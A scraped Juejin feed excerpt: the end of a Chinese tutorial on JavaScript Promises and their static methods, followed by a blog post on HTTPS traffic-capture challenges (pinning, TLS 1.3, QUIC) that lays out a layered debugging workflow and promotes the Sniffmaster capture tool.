      <span class="hljs-comment">// 模拟成功场景：调用resolve传递结果</span>
      <span class="hljs-title function_">resolve</span>({ <span class="hljs-attr">userId</span>: userId, <span class="hljs-attr">userName</span>: <span class="hljs-string">"张三"</span> });
      <span class="hljs-comment">// 模拟失败场景：调用reject传递错误</span>
      <span class="hljs-comment">// reject(new Error("获取用户信息失败"));</span>
    }, <span class="hljs-number">1000</span>);
  });
}
</code></pre>
<h3 data-id="heading-6">3.2 处理Promise结果：then与catch</h3>
<p>Promise实例创建后，需要通过<code>then</code>方法处理成功结果，通过<code>catch</code>方法处理失败原因。此外，<code>finally</code>方法用于指定无论Promise状态如何都会执行的回调函数。</p>
<p>示例：使用then、catch、finally处理Promise</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">getUserInfo</span>(<span class="hljs-number">1</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">userInfo</span>) =&gt;</span> {
    <span class="hljs-comment">// 处理成功结果</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"用户信息："</span>, userInfo);
    <span class="hljs-comment">// 可以返回一个新的Promise，实现链式调用</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getOrders</span>(userInfo); <span class="hljs-comment">// 假设getOrders已改为Promise版本</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">orders</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"订单列表："</span>, orders);
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">getLogistics</span>(orders[<span class="hljs-number">0</span>]); <span class="hljs-comment">// 假设getLogistics已改为Promise版本</span>
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">logistics</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"物流信息："</span>, logistics);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-comment">// 统一处理所有异步操作的错误</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"出错了："</span>, err.<span class="hljs-property">message</span>);
  })
  .<span class="hljs-title function_">finally</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 无论成功或失败，都会执行（如关闭加载动画）</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"异步操作结束"</span>);
  });
</code></pre>
<p>上述代码通过<code>then</code>的链式调用，将原本嵌套的异步逻辑改为线性结构，可读性大幅提升。值得注意的是，<code>then</code>方法会返回一个新的Promise实例，这是实现链式调用的核心原因。如果在<code>then</code>的回调函数中返回一个值，该值会被包装成一个状态为fulfilled的Promise；如果返回一个Promise实例，则新Promise的状态由该实例决定。</p>
<h2 data-id="heading-7">四、Promise的常用静态方法</h2>
<p>除了实例方法，Promise还提供了多个静态方法，用于处理多个异步操作的场景，极大提升了异步编程的灵活性。</p>
<h3 data-id="heading-8">4.1 Promise.all(iterable)</h3>
<p>接收一个可迭代对象（如数组），该对象中的每个元素都是Promise实例。其特性如下：</p>
<ul>
<li>只有当<strong>所有</strong>Promise实例都变为fulfilled状态时，返回的新Promise才会变为fulfilled，结果是一个包含所有成功结果的数组，顺序与传入的Promise顺序一致。</li>
<li>只要有<strong>一个</strong>Promise实例变为rejected状态，返回的新Promise就会立即变为rejected，结果是该失败Promise的失败原因。</li>
</ul>
<p>适用场景：需要等待多个独立的异步操作全部完成后，再执行后续逻辑（如同时加载多个资源）。</p>
<p>示例：使用Promise.all处理多个异步操作</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟三个独立的异步请求</span>
<span class="hljs-keyword">const</span> request1 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">"请求1成功"</span>);
<span class="hljs-keyword">const</span> request2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"请求2成功"</span>), <span class="hljs-number">1000</span>));
<span class="hljs-keyword">const</span> request3 = <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">"请求3成功"</span>);

<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([request1, request2, request3])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">results</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"所有请求成功："</span>, results); <span class="hljs-comment">// ["请求1成功", "请求2成功", "请求3成功"]</span>
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"某个请求失败："</span>, err);
  });
</code></pre>
<h3 data-id="heading-9">4.2 Promise.race(iterable)</h3>
<p>同样接收一个可迭代对象，其特性与<code>Promise.all</code>相反：</p>
<ul>
<li>只要有<strong>一个</strong>Promise实例的状态发生改变（无论是fulfilled还是rejected），返回的新Promise就会立即变为相同的状态，结果为该Promise的结果。</li>
</ul>
<p>适用场景：设置异步操作的超时时间（如请求接口时，如果超过5秒未响应则提示超时）。</p>
<p>示例：使用Promise.race实现超时控制</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 模拟接口请求</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"接口数据返回"</span>), <span class="hljs-number">3000</span>);
  });
}

<span class="hljs-comment">// 模拟超时</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">timeout</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"请求超时（2秒）"</span>)), <span class="hljs-number">2000</span>);
  });
}

<span class="hljs-comment">// 谁先改变状态就取谁的结果</span>
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">race</span>([<span class="hljs-title function_">fetchData</span>(), <span class="hljs-title function_">timeout</span>()])
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"成功："</span>, data);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"失败："</span>, err.<span class="hljs-property">message</span>); <span class="hljs-comment">// 输出"请求超时（2秒）"</span>
  });
</code></pre>
<h3 data-id="heading-10">4.3 Promise.allSettled(iterable)</h3>
<p>接收一个可迭代对象，等待所有Promise实例都变为终态（fulfilled或rejected）后，返回的新Promise才会变为fulfilled，结果是一个包含每个Promise结果的数组。每个结果对象包含两个属性：</p>
<ul>
<li><code>status</code>：字符串，值为"fulfilled"或"rejected"。</li>
<li><code>value</code>：当status为"fulfilled"时存在，为成功结果。</li>
<li><code>reason</code>：当status为"rejected"时存在，为失败原因。</li>
</ul>
<p>适用场景：需要获取所有异步操作的结果（无论成功或失败），如批量上传文件后，显示每个文件的上传状态。</p>
<h3 data-id="heading-11">4.4 Promise.resolve(value)与Promise.reject(reason)</h3>
<ul>
<li><code>Promise.resolve(value)</code>：快速创建一个状态为fulfilled的Promise实例，结果为value。如果value本身是一个Promise实例，则直接返回该实例。</li>
<li><code>Promise.reject(reason)</code>：快速创建一个状态为rejected的Promise实例，原因是reason。</li>
</ul>
<p>适用场景：将现有值或回调函数转换为Promise，实现接口统一。</p>
<h2 data-id="heading-12">五、Promise的实际应用场景</h2>
<p>Promise在实际开发中应用广泛，以下是几个典型场景：</p>
<h3 data-id="heading-13">5.1 处理网络请求</h3>
<p>前端开发中，网络请求（如使用fetch或axios）是最常见的异步操作，而axios本身就返回Promise实例，fetch也可以通过简单封装转为Promise使用。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 使用axios发送请求（axios默认返回Promise）</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">"axios"</span>;

axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">"https://api.example.com/users/1"</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"用户数据："</span>, response.<span class="hljs-property">data</span>);
    <span class="hljs-keyword">return</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`https://api.example.com/users/1/orders`</span>);
  })
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">response</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"订单数据："</span>, response.<span class="hljs-property">data</span>);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"请求失败："</span>, err);
  });
</code></pre>
<h3 data-id="heading-14">5.2 封装回调函数为Promise</h3>
<p>对于一些老的API（如Node.js的fs模块早期方法），它们采用回调函数形式，可通过Promise封装使其支持链式调用。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">"fs"</span>);

<span class="hljs-comment">// 封装fs.readFile为Promise版本</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">readFilePromise</span>(<span class="hljs-params">path, encoding</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    fs.<span class="hljs-title function_">readFile</span>(path, encoding, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> {
      <span class="hljs-keyword">if</span> (err) {
        <span class="hljs-title function_">reject</span>(err); <span class="hljs-comment">// 失败时调用reject</span>
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title function_">resolve</span>(data); <span class="hljs-comment">// 成功时调用resolve</span>
      }
    });
  });
}

<span class="hljs-comment">// 使用封装后的方法</span>
<span class="hljs-title function_">readFilePromise</span>(<span class="hljs-string">"./test.txt"</span>, <span class="hljs-string">"utf8"</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"文件内容："</span>, data);
  })
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"读取文件失败："</span>, err);
  });
</code></pre>
<h3 data-id="heading-15">5.3 并行处理多个异步任务</h3>
<p>当需要同时执行多个独立的异步任务，并在所有任务完成后进行汇总时，<code>Promise.all</code>是最佳选择。</p>
<pre><code class="hljs language-ini" lang="ini">// 同时获取商品列表、分类列表、用户信息
const <span class="hljs-attr">getGoodsList</span> = axios.get(<span class="hljs-string">"https://api.example.com/goods"</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">getCategoryList</span> = axios.get(<span class="hljs-string">"https://api.example.com/categories"</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">getUserInfo</span> = axios.get(<span class="hljs-string">"https://api.example.com/user"</span>)<span class="hljs-comment">;</span>

Promise.all(<span class="hljs-section">[getGoodsList, getCategoryList, getUserInfo]</span>)
  .then((<span class="hljs-section">[goodsRes, categoryRes, userRes]</span>) =&gt; {
    // 解构赋值获取每个请求的结果
    const <span class="hljs-attr">goods</span> = goodsRes.data<span class="hljs-comment">;</span>
    const <span class="hljs-attr">categories</span> = categoryRes.data<span class="hljs-comment">;</span>
    const <span class="hljs-attr">user</span> = userRes.data<span class="hljs-comment">;</span>
    // 汇总数据并渲染页面
    renderPage(goods, categories, user)<span class="hljs-comment">;</span>
  })
  .catch((err) =&gt; {
    console.error("数据加载失败：", err)<span class="hljs-comment">;</span>
  })<span class="hljs-comment">;</span>
</code></pre>
<h2 data-id="heading-16">六、Promise的注意事项</h2>
<ol>
<li><strong>状态不可逆</strong>：一旦Promise的状态从pending转为fulfilled或rejected，就无法再改变。因此，<code>resolve</code>和<code>reject</code>只有第一次调用有效，后续调用会被忽略。</li>
<li><strong>错误捕获</strong>：如果在<code>then</code>的回调函数中抛出错误，会被后续的<code>catch</code>捕获；但如果没有设置<code>catch</code>，未捕获的错误会导致程序报错（在浏览器中会触发<code>unhandledrejection</code>事件）。</li>
<li><strong>链式调用的返回值</strong>：<code>then</code>方法返回的是新的Promise实例，因此链式调用中的每个<code>then</code>都是在处理前一个<code>then</code>的返回结果。</li>
<li><strong>Promise.all的失败快速返回</strong>：<code>Promise.all</code>只要有一个Promise失败就会立即返回失败结果，不会等待其他Promise完成。如果需要等待所有Promise完成再处理结果，应使用<code>Promise.allSettled</code>。</li>
</ol>
<h2 data-id="heading-17">七、总结</h2>
<p>Promise作为JavaScript异步编程的核心方案，通过状态不可逆的机制和链式调用的语法，有效解决了回调地狱问题，让异步代码更具可读性和可维护性。掌握Promise的创建、状态变化、<code>then/catch/finally</code>实例方法以及<code>Promise.all</code>等静态方法，是前端开发者必备的技能。</p>
<p>需要注意的是，Promise并非异步编程的终点，ES2017引入的async/await语法，正是基于Promise的语法糖，进一步简化了异步代码的书写。但要真正理解async/await，必须先扎实掌握Promise的核心原理。希望本文能帮助你深入理解Promise，并在实际开发中灵活运用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HTTPS Everywhere 时代的抓包挑战，从加密流量解析到底层数据流捕获的全流程方案]]></title>    <link>https://juejin.cn/post/7579887768227872802</link>    <guid>https://juejin.cn/post/7579887768227872802</guid>    <pubDate>2025-12-05T03:56:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579887768227872802" data-draft-id="7579887768227856418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HTTPS Everywhere 时代的抓包挑战，从加密流量解析到底层数据流捕获的全流程方案"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-05T03:56:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心猴爷"/> <meta itemprop="url" content="https://juejin.cn/user/2179705232165364"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HTTPS Everywhere 时代的抓包挑战，从加密流量解析到底层数据流捕获的全流程方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2179705232165364/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心猴爷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:56:33.000Z" title="Fri Dec 05 2025 03:56:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>近年来，随着浏览器、移动系统、安全标准全面推进加密化，<strong>“HTTPS Everywhere”</strong> 已从理念变为现实。几乎所有 Web 流量、移动端 API、后台服务通信都默认启用 HTTPS，甚至进一步强化到 <strong>HSTS、证书链严格校验、TLS1.3、HTTP/2、HTTP/3（QUIC）</strong> 等机制。</p>
<p>加密全面普及是好事，但对于开发者而言，一个问题随之变得更加突出：</p>
<blockquote>
<p><strong>抓包越来越难了。尤其是在 iOS、移动 App、QUIC、Pinning 等环境下，很多 HTTPS 流量完全无法被传统代理工具解密。</strong></p>
</blockquote>
<p>本篇文章聚焦 <strong>HTTPS Everywhere 时代的抓包难题</strong>，通过工程实践分析 TLS 加密带来的抓包变化，并提供一套能覆盖现代网络场景的抓包方法。</p>
<hr/>
<h2 data-id="heading-0">一、HTTPS Everywhere 为什么让抓包变得更困难？</h2>
<h3 data-id="heading-1"><strong>加密默认开启，抓包工具无法直接查看明文</strong></h3>
<p>无论是浏览器还是 App，大部分请求都强制通过 HTTPS。
加密后只能看到：</p>
<ul>
<li>握手</li>
<li>SNI</li>
<li>加密后的 Application Data</li>
</ul>
<p>业务数据无法直接查看。</p>
<hr/>
<h3 data-id="heading-2"><strong>TLS 证书链严格校验</strong></h3>
<p>iOS/macOS/浏览器会校验证书链：</p>
<ul>
<li>中间证书缺失</li>
<li>根证书不被信任</li>
<li>自签证书不被接受</li>
</ul>
<p>都会导致代理抓包工具无法解密，表现为：</p>
<ul>
<li>Charles 只看到 CONNECT</li>
<li>Fiddler 显示 Tunnel Established</li>
<li>App 报 SSL 错误</li>
</ul>
<hr/>
<h3 data-id="heading-3"><strong>App 普遍加入证书 Pinning</strong></h3>
<p>尤其金融、社交、政务类 App，Pinning 会让代理证书直接失效，导致：</p>
<p>浏览器能抓
✘ App 完全抓不到</p>
<hr/>
<h3 data-id="heading-4"><strong>TLS1.3 协议增强加密字段</strong></h3>
<p>TLS1.3：</p>
<ul>
<li>加密握手阶段更多字段</li>
<li>某些客户端禁用降级</li>
</ul>
<p>导致传统“半透明解密”方法更难实现。</p>
<hr/>
<h3 data-id="heading-5"><strong>HTTP/3（QUIC）基于 UDP，不走代理</strong></h3>
<p>QUIC 天然绕过代理机制，因此：</p>
<ul>
<li>Charles / Proxyman 抓不到</li>
<li>Wireshark 能看到 UDP</li>
<li>App 业务依旧正常运行</li>
</ul>
<p>HTTPS Everywhere 时代，QUIC 的普及让抓包难度再上一个台阶。</p>
<hr/>
<h2 data-id="heading-6">二、HTTPS Everywhere 时代的抓包方式必须“分层化”</h2>
<p>为了应对增强加密体系，抓包工具必须按层次协同工作。</p>
<hr/>
<h2 data-id="heading-7"><strong>① 代理层：用于传统 HTTPS 解密（能分析业务明文）</strong></h2>
<p>工具：</p>
<ul>
<li>Charles</li>
<li>Proxyman</li>
<li>Fiddler</li>
<li>mitmproxy</li>
</ul>
<p>适用于：</p>
<ul>
<li>常规 HTTPS</li>
<li>Web 调试</li>
<li>修改请求与响应</li>
</ul>
<p>不适用于：</p>
<ul>
<li>Pinning</li>
<li>QUIC</li>
<li>自定义协议</li>
</ul>
<hr/>
<h2 data-id="heading-8"><strong>② 协议层：分析 TLS、QUIC、TCP 原始数据</strong></h2>
<p>工具：</p>
<ul>
<li>Wireshark</li>
<li>tcpdump</li>
</ul>
<p>适用于：</p>
<ul>
<li>TLS 握手分析</li>
<li>检查证书链</li>
<li>查看 QUIC（UDP）是否存在</li>
<li>判断是否丢包</li>
</ul>
<p>但不足之处是流量太多，不容易按应用区分。</p>
<hr/>
<h2 data-id="heading-9"><strong>③ 底层补抓层：解决“代理无法抓包”的关键</strong></h2>
<p>此层用于捕获<strong>真实的应用网络流量</strong>，不依赖代理。
在 HTTPS Everywhere 环境中，这是不可或缺的抓包方式。</p>
<p>典型需要此层的场景：</p>
<ul>
<li>TLS Pinning</li>
<li>QUIC</li>
<li>WebSocket</li>
<li>自定义 TCP 协议</li>
<li>代理被系统/VPN 覆盖</li>
</ul>
<hr/>
<h2 data-id="heading-10"><strong>抓包大师（Sniffmaster）在 HTTPS Everywhere 抓包体系中的作用</strong></h2>
<h3 data-id="heading-11"><strong>Sniffmaster 能做什么？</strong></h3>
<ul>
<li>捕获 <strong>HTTPS / TCP / UDP / HTTP</strong> 数据流</li>
<li>自动识别协议类型（HTTP、HTTPS、mdns 等）</li>
<li>按 <strong>App / 域名过滤</strong>，降低噪音</li>
<li>数据流多格式展示（明文、HEX、二进制）</li>
<li>导出 <strong>Wireshark 兼容 pcap 文件</strong></li>
<li>支持 JavaScript 拦截器对请求/响应进行修改</li>
<li>适用于 macOS、Windows、iOS 场景</li>
</ul>
<p>特别擅长用于：</p>
<ul>
<li>代理抓不到 HTTPS（pinning）</li>
<li>QUIC 抓包</li>
<li>WebSocket 二进制数据</li>
<li>自定义协议无法被代理识别</li>
<li>需要底层流量与 TLS 握手对比分析</li>
</ul>
<p>Sniffmaster 本质是一种“底层补抓工具”，用于处理 HTTPS Everywhere 环境中的极端抓包场景。</p>
<hr/>
<h2 data-id="heading-12">三、完整抓包流程：在 HTTPS Everywhere 下如何定位问题？</h2>
<hr/>
<h3 data-id="heading-13"><strong>步骤 ①：尝试代理抓包（业务层）</strong></h3>
<p>能解密的场景：</p>
<ul>
<li>开发环境 HTTPS</li>
<li>未开启 pinning</li>
<li>非 QUIC 流量</li>
</ul>
<p>可以直接进行 API 调试。</p>
<hr/>
<h3 data-id="heading-14"><strong>步骤 ②：无法解密 → 检查证书链</strong></h3>
<p>检查：</p>
<ul>
<li>证书是否被完全信任</li>
<li>是否有中间证书缺失</li>
<li>是否存在公司/网络注入的中间代理</li>
</ul>
<hr/>
<h3 data-id="heading-15"><strong>步骤 ③：浏览器能抓 App 抓不到 → Pinning</strong></h3>
<p>此时代理层彻底失效。</p>
<hr/>
<h3 data-id="heading-16"><strong>步骤 ④：部分接口抓不到 → 很可能是 QUIC</strong></h3>
<p>验证方式：</p>
<ul>
<li>Wireshark 查看 UDP 443</li>
<li>使用 Sniffmaster 捕获 UDP 数据流</li>
<li>在 App 中关闭 QUIC 再对比</li>
</ul>
<hr/>
<h3 data-id="heading-17"><strong>步骤 ⑤：代理完全没有流量 → 系统代理被覆盖</strong></h3>
<p>常见于：</p>
<ul>
<li>VPN</li>
<li>MDM</li>
<li>零信任网络</li>
</ul>
<hr/>
<h3 data-id="heading-18"><strong>步骤 ⑥：使用 Sniffmaster 进行底层补抓（关键步骤）</strong></h3>
<p>流程：</p>
<ol>
<li>按 App/域名过滤流量</li>
<li>捕获 HTTPS/TCP/UDP 数据流</li>
<li>导出 pcap 用 Wireshark 分析 TLS/QUIC</li>
<li>定位失败点：
<ul>
<li>pinning？</li>
<li>QUIC？</li>
<li>TLS 握手失败？</li>
<li>自定义协议？</li>
</ul>
</li>
</ol>
<p>这是 HTTPS Everywhere 环境下最可靠的抓包方法。</p>
<hr/>
<h2 data-id="heading-19">四、真实案例：HTTPS Everywhere 环境下部分接口无法抓包</h2>
<p>表现：</p>
<ul>
<li>Charles 抓不到视频相关 HTTPS</li>
<li>Safari 能抓文本接口</li>
<li>Wireshark 出现大量 UDP 包</li>
</ul>
<p>排查：</p>
<ol>
<li>确认代理工具配置正常</li>
<li>确认证书链无误</li>
<li>使用 Sniffmaster 抓取 UDP 流量</li>
<li>导出 pcap → Wireshark 显示 QUIC 连接</li>
<li>conclude：API 使用 HTTP/3，不走代理</li>
</ol>
<p>通过底层数据流，准确定位 QUIC 为根因。</p>
<hr/>
<h2 data-id="heading-20">HTTPS Everywhere 时代，抓包可以分层组合</h2>





